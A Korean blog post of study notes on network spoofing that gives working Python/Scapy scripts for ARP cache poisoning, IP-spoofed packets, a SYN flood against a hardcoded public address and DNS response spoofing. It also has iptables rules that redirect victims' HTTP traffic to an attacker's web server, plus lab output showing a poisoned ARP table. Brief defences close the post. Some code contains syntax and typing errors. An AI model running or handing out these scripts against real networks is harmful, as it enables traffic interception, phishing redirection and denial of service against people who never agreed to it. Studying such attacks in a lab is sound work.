---
title: "Cryptography: 스푸핑"
last_modified_at: 2020-10-13T00:26:02-05:00
categories:
  - Cryptography
tags:
  - 암호학
  - 파이썬
  - 암호와 해킹 1판
toc: true 
toc_label: "Table of Contents"
toc_icon: "cog"
toc_sticky: true 
author_profile: true 
read_time: false 
---

`이 게시물은 화이트해커를 위한 암호와 해킹 1판을 참고하여 작성하였습니다.`

---
### ARP 스푸핑을 구현해보자
---



```python
from scapy.all import *
from time import sleep
#from scapy.layers.12 import Ether, ARP

def getMAC(ip): #맥주소를 얻는 과정 
    ans, unans = srp(Ether(dst='ff-ff-ff-ff-ff-ff')/ARP(pdst=ip), timeout=5, retry=3)
    for s, r in ans:
        return r.sprintf('%Ether.src%')
        
def poisonARP(srcip, targetip, targetmac):
    arp=ARP(op=2, psrc=srcip, pdst=targetip, hwdst=targetmac)
    #arp reply를 srcip 주소로 targetip에 전송하여 목적지 mac주소를 targetmac으로 지정
    send(arp)
  
def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
    #피해를 입었는지 모르게 복구
    arp1=ARP(op=2, psrc=gatewayip, pdst=victimip, hwdst='ff-ff-ff-ff-ff-ff', hwsrc=gatewaymac)
    #arp1은 희생자 컴퓨터의 ARP 테이블에서 게이트웨이 MAC주소를 원래대로 복구하기 위한 ARP패킷
    arp2=ARP(op=2, psrc=victimip, pdst=gatewayip, hwdst='ff-ff-ff-ff-ff-ff', hwsrc=victimmac)
    #arp2는 게이트웨이 ARP 테이블에서 피해 컴퓨터의 MAC 주소를 원래대로 복구하기 위한 ARP패킷
    send(arp1, count=3)
    send(arp2, count=3)

def main():
    gatewayip='192.168.0.1'
    victimip ='192.168.0.234'
    
    victimmac=getMAC(victimip) #맥주소를 얻어온다.
    gatewaymac=getMAC(gatewayip)
    
    if victimmac == None or gatewaymac == None: #맥주소를 얻는데 실패했을 경우
        print('MAC주소를 찾을 수 없습니다')
        return
    print('ARP Spoofing start -> Victim IP [%s]' %victimip) #맥주소를 얻었을 경우
    print('[%s]: Poison ARP Table [%s] -> [%s]' %(victimip, gatewaymac, victimmac))
    
    try:
        while True:
            poisonARP(gatewayip, victimip, victimmac) #스푸핑을 시작한다
            poisonARP(victimip, gatewayip, gatewaymac)
            sleep(3)
    except KeyboardInterrupt:
        restoreARP(victimip, gatewayip, victimmac, gatewaymac)
        print('ARP Spoogin done -> Restored ARP Table')
        
if __name__ == '__main__':
    main()
```

실험이 잘 안되었다. 공유기를 사용해서 그런 것일까?
{: .notice}

```
Begin emission:
.............Begin emission:
.......Begin emission:
................Begin emission:
.*
Received 38 packets, got 1 answers, remaining 0 packets
Begin emission:
......Begin emission:
.....Begin emission:
.....Begin emission:
........
Received 24 packets, got 0 answers, remaining 1 packets
MAC주소를 찾을 수 없습니다
```

노트북이 공유기와 연결되어있고 vmware를 통해 연결된 kali를 target으로 하려다 보니 소스 코드를 수정해야했다.
getMAC 함수에서는 Ether를 사용해서 arp ping을 보내는데 AP로 부터 mac 주소를 가져오기 위해 새로
ap_map 함수를 만들고 sniff를 사용하여 ip 주소를 기준으로 필터링한 패킷을 받아 mac 주소를 받아오도록 하였다.
더 나은 방법이 있을지도 모르곘다. 다음에 찾아보겠다.
{: .notice}

```python
#code5_17

from scapy.all import *
from time import sleep
#from scapy.layers.12 import Ether, ARP

#def getMAC(ip): #맥주소를 얻는 과정 
#    ans, unans = srp(Ether(dst='ff-ff-ff-ff-ff-ff')/ARP(pdst=ip), timeout=5, retry=3)
#    for s, r in ans:
#        return r.sprintf('%Ether.src%')

def ap_mac(pkt):
    if pkt.haslayer(Dot11):
        if pkt.type == 0 and pkt.subtype == 8:
            return pkt.addr3
        else:
            return ''
            
    

def poisonARP(srcip, targetip, targetmac):
    arp=ARP(op=2, psrc=srcip, pdst=targetip, hwdst=targetmac)
    #arp reply를 srcip 주소로 targetip에 전송하여 목적지 mac주소를 targetmac으로 지정
    send(arp)
  
def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
    #피해를 입었는지 모르게 복구
    arp1=ARP(op=2, psrc=gatewayip, pdst=victimip, hwdst='ff-ff-ff-ff-ff-ff', hwsrc=gatewaymac)
    #arp1은 희생자 컴퓨터의 ARP 테이블에서 게이트웨이 MAC주소를 원래대로 복구하기 위한 ARP패킷
    arp2=ARP(op=2, psrc=victimip, pdst=gatewayip, hwdst='ff-ff-ff-ff-ff-ff', hwsrc=victimmac)
    #arp2는 게이트웨이 ARP 테이블에서 피해 컴퓨터의 MAC 주소를 원래대로 복구하기 위한 ARP패킷
    send(arp1, count=3)
    send(arp2, count=3)

def main():
    gatewayip='172.30.1.254'
    victimip ='172.30.1.2'
    
    # victimmac=getMAC(victimip) #맥주소를 얻어온다.
    # gatewaymac=getMAC(gatewayip)
    
    victimmac= sniff( filter = gatewayip,prn = ap_mac)
    print("victimmac",victimmac)
    gatewaymac= sniff( filter = victimip,prn = ap_mac)
    print("gatewaymac", gatewaymac)
    
    if victimmac == None or gatewaymac == None: #맥주소를 얻는데 실패했을 경우
        print('MAC주소를 찾을 수 없습니다')
        return
    print('ARP Spoofing start -> Victim IP [%s]' %victimip) #맥주소를 얻었을 경우
    print('[%s]: Poison ARP Table [%s] -> [%s]' %(victimip, gatewaymac, victimmac))
    
    try:
        while True:
            poisonARP(gatewayip, victimip, victimmac) #스푸핑을 시작한다
            poisonARP(victimip, gatewayip, gatewaymac)
            sleep(3)
    except KeyboardInterrupt:
        restoreARP(victimip, gatewayip, victimmac, gatewaymac)
        print('ARP Spoogin done -> Restored ARP Table')
        
if __name__ == '__main__':
    main()
```

실행 후 출력 메세지
{: .notice}

```
C:\Users\authe\OneDrive\바탕 화면\Source>python code5_17
victimmac <Sniffed: TCP:3 UDP:33 ICMP:0 Other:0>
gatewaymac <Sniffed: TCP:0 UDP:0 ICMP:0 Other:0>
ARP Spoofing start -> Victim IP [172.30.1.2]
[172.30.1.2]: Poison ARP Table [<Sniffed: TCP:0 UDP:0 ICMP:0 Other:0>] -> [<Sniffed: TCP:3 UDP:33 ICMP:0 Other:0>]
Sent 36 packets.

Sent 0 packets.

Sent 0 packets.
............................................................................................................
Sent 108 packets.
ARP Spoogin done -> Restored ARP Table
```

arp spoofing 실행 전 arp 테이블
{: .notice}

```
인터페이스: 172.30.1.30 --- 0xa
  인터넷 주소           물리적 주소           유형
  172.30.1.2            38-00-25-94-92-a1     동적 #
  172.30.1.3            f0-18-98-9b-f2-29     동적
  172.30.1.50           a0-c5-89-06-1d-1e     동적
  172.30.1.254          88-3c-1c-94-cf-a7     동적 #
  172.30.1.255          ff-ff-ff-ff-ff-ff     정적
  224.0.0.2             01-00-5e-00-00-02     정적
  224.0.0.22            01-00-5e-00-00-16     정적
  224.0.0.251           01-00-5e-00-00-fb     정적
  224.0.0.252           01-00-5e-00-00-fc     정적
  239.255.255.250       01-00-5e-7f-ff-fa     정적
  255.255.255.255       ff-ff-ff-ff-ff-ff     정적
```

arp spoofing 실행 후 arp 테이블
{: .notice}

```
인터페이스: 172.30.1.30 --- 0xa
  인터넷 주소           물리적 주소           유형
  172.30.1.2            38-00-25-94-92-a1     동적  #
  172.30.1.3            f0-18-98-9b-f2-29     동적
  172.30.1.50           a0-c5-89-06-1d-1e     동적
  172.30.1.254          38-00-25-94-92-a1     동적  #
  172.30.1.255          ff-ff-ff-ff-ff-ff     정적
  224.0.0.2             01-00-5e-00-00-02     정적
  224.0.0.22            01-00-5e-00-00-16     정적
  224.0.0.251           01-00-5e-00-00-fb     정적
  224.0.0.252           01-00-5e-00-00-fc     정적
  239.255.255.250       01-00-5e-7f-ff-fa     정적
  255.255.255.255       ff-ff-ff-ff-ff-ff     정적
```

---
### ARP 스푸핑으로 피싱 사이트 유도하기
---

공격자는 자신의 컴퓨터에서 IP 테이블을 조작하여 피해 컴퓨터로부터 전달된 네트워크 데이터를 특정 사이트로 리다이렉션 할 수 있습니다.   
공격자가 웹서버를 운영하고 있다면 피해 컴퓨터로 부터 전달되는 HTTP 패킷을 공격자의 웹서버로 리다이렉션이 가능합니다.  
{: .notice}

먼저 웹 서버의 다큐먼트 루트에 index.html을 다음과 같이 추가한다.
{: .notice}

```
root@kali:~# ls -lh /var/www/html
합계 8.0K
-rw-r--r-- 1 root root 218 Sep 22 17:24 index.html
-rw-r--r-- 1 root root 612 May  8 21:24 index.nginx-debian.html
root@kali:~# service apache2 restart
```

```html
<html>
	<center>
	<h1> HELLO! WELCOME TO MY SITE </h1>
	<h3> Your Computer is SPOOOOOOOFED!</h3>
	<img src="anonymous.jpg"/>
	</center>
</html>
```

공격자 컴퓨터의 IP 테이블을 다음 명령으로 수정한다.
{: .notice}

```
iptables -t nat -F
iptables -Z			#라우팅테이블 초기화
iptables -A FORWARD -i eth0 -j ACCEPT #eth0로 들어오는 모든 패킷 허용
ipatbles -t nat -A POSTROUTING -o eth0 -j MASQUERADE #컴퓨터의 사설 IP주소를 게이트웨이의 외부 IP 주소로 변경하게 한다.
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination <공격자 웹 서버 IP>
#LAN 외부에서 80번 포트로 들어오는 모든 HTTP 연결을 별개의 네트워크에 있는 HTTP 서버로 라우팅한다.
```

실제 실행해보니 원하는대로 화면이 나타나진 않았다. 하지만 사이트에 들어가려고 시도하면 연결이 끊겼다.
{: .notice}

---
### IP 스푸핑
---

* **IP 스푸핑을 통해 수행되는 공격**
* Syn Flooding 공격
* 커넥션 가로채기
* 순서제어번호 추측 공격
* 접속 끊기 공격
{: .notice}

IP 주소를 위조하여 Ping을 보내보자.
{: .notice}

```python
from scapy.all import *

def ipSpoof(srcip, dstip):
    ip_packet = IP(src=srcip, dst=dstip)/ICMP()
    print(ip_packet.show())
    send(ip_packet)

def main():
    srcip = '172.21.70.227'
    dstip = '172.21.70.180'
    ipSpoof(srcip, dstip)
    print('SENT SPOOFED IP [%s] to [%s]' %(srcip, dstip))
    
if __name__=='__main__':
    main()
```

IP 스푸핑을 이용하여 Syn Flooding을 해보자
{: .notice}

```python
from scapy.all import *
from random import shuffle

def getRandomIP(): #랜덤한 IP 주소를 얻는다.
    ipfactors = [x for x in range(256)]
    tmpip = []
    for i in range(4):
        shuffle(ipfactors)
        tmpip.append(str(ipfactors[0]))
    randomip = '.'.join(tmpip)
    return randomip
    
def synAttack(targetip):
    srcip = getRandomIP()
    P_IP = IP(src=srcip, dst=targetip)
    P_TCP = TCP(dport=range(1, 1024), flags='S')
    packet = P_IP/P_TCP
    srflood(packet, store=0) #syn flooding 수행
   
def main():
    targetip = '123.223.221.111'
    synAttack(targetip)
    
if __name__ = '__main__':
    main()
```

리눅스에서는 syn flooding에 의한 자원고갈을 막기위해 syn cookies 를 사용한다.
{: .notice}

```
#echo 1> /proc/sys/net/ipv4/tcp_syncookies
```

---
### DNS 스푸핑
---

DNS 스푸핑은 공격자가 중간에서 DNS 쿼리 패킷을 가로채어 질의한 IP를 조작한 후 DNS 응답 패킷을 피해 컴퓨터로 보내는 해킹 기법입니다.
{: .notice}

하지만 아래 코드의 경우 로컬 DNS 서버로 DNS 쿼리를 보낸 것을 가로챈 후 정상 DNS 서버로 포워딩 하고있어서 공격자가 변조한 DNS와 
실제 DNS 서버로 부터 전송된 DNS 응답 모두 전달되어서 결론적으로 더 빨리 도착한 DNS 응답을 받게 된다.
{: .notice--info}

```python
from scapy.all import *

def dnsSpoof(packet):
	spoofDNS = '172.21.70.227' #이 주소로 변조
	dstip = packet[IP].src
    srcip = packet[IP].dst
    sport = packet[UDP].sport
    dport = packet[UDP].dport
    
    if packet.haslayer(DNSQR): #패킷이 DNS 쿼리를 포함하고 있을 경우에 DNS 응답을 생성하는 부분
        dnsid = packet[DNS].id
        qd = packet[DNS].qd
        dnsrr = DNSRR(rrname=qd.qname, ttl=10, rdata=spoofDNS) #변조한 주소를 넣는다
        spoofPacket = IP(dst=dstip, src=srcip)/\ #실제 응답 패킷 구성
        UDP(dport=sport, sport=dport)/DNS(id=dnsid, qd=qd, aa=1, qr=1, an=dnsrr)
        send(spoofPacket) #패킷 전송
        print('+++ SOURCE[%s] -> DEST[%s]' %(dstip, srcip))
        print(spoofPacket.summary())
        
def main():
    print('+++DNS SPOOF START...')
    sniff(filter='udp port 53', store=0, prn=dnsSpoof)
    
if __name__ == '__main__':
    main()
```

(더 늦게 도착은 패킷은 버린다: DNS 경쟁) 더 확실하게 DNS 스푸핑을 하려면 IP 테이블을 수정하여 UDP 53번 포트로 포워딩 되는
데이터를 따로 처리하여 정상 DNS로 가지 못하도록 해야한다. 이를 위해서 파이썬 외부 모듈로 nfqueue 모듈을 사용할 수 있다.(리눅스)
{: .notice--info}

---
### 보안 대책
---

* ARP 스푸핑
	* 게이트웨이 MAC주소를 변조하지 못하도록 정적으로 설정
{: .notice}

* IP 스푸핑
	* 구조적 취약점으로 완전한 보안책은 없다. 
	* 지속적 모니터링 필요
	* 패킷 필터링을 통해서 스위치/라우터에서 보내는 주소가 내부 IP 주소인 경우 차단
	* rsh, rlogin과 같이 패스워드에 의한 인증 과정이 없는 서비스를 사용하지 않는다.
{: .notice}

* DNS 스푸핑 방어 대책
	* DNS 요청시 무작위로 포트번호를 선택하고 비밀번호 생성을 통해 경쟁공격 대응 가능
	* DNS 캐시 변조 방어를 위해 DNSSEC를 적용하여 디지털 서명을 통해 DNS 데이터를 검증한다
	* DNS 스푸핑 공격에 대응하기위해서
		* 모든 DNS 쿼리는 로컬 DNS 서버에서만 해석하도록함
		* 외부 서버로 향하는 DNS 요청을 막음 
		* DNSSEC를 적용
		* DNS 해석기에 무작위 포트 번호를 처리할 수 있도록 설정
		* 방화벽에 외부 DNS 룩업을 제한 하도록 설정
		* 모든 사용자에게 Recursive DNS 서비스를 제한
{: .notice}
